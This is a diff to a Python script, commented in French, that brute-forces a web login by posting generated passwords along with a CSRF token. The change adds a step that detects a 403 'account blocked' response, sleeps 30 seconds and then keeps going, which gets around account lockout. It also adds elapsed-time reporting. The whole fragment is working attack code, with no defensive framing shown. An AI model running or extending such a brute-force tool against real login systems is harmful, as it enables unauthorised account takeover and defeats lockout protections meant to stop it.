@@ -30,7 +30,15 @@ def try_password(password):
     headers = {
         'X-CSRFToken': csrf_token,
     }
+    
     response = session.post(url, data=data, headers=headers)
+    #response = requests.post(url, data=data, headers=headers)
+
+    if response.status_code == 403:
+            print("le compte A ete blocker wait 30 seconde pour la prochaine attaque")
+            time.sleep(30)  # Attente de 30 secondes 
+            return False  # Retourne False pour indiquer l'échec de la tentative
+    
     if "Login successful!" in response.text:
         print(f"Connexion réussie avec : {username} / {password}")
         return True
@@ -50,7 +58,8 @@ def brute_force_attack(max_length=10):
                 end_time = time.time()  # Arrêter le chronomètre
                 print(f"Temps d'exécution: {end_time - start_time:.2f} secondes")
                 return password  # Retourner le mot de passe trouvé et arrêter
-
+    end_time = time.time()  # Arrêter le chronomètre
+    print(f"Temps d'exécution: {end_time - start_time:.2f} secondes")
 # Lancer l'attaque par force brute
 found_password = brute_force_attack()
 
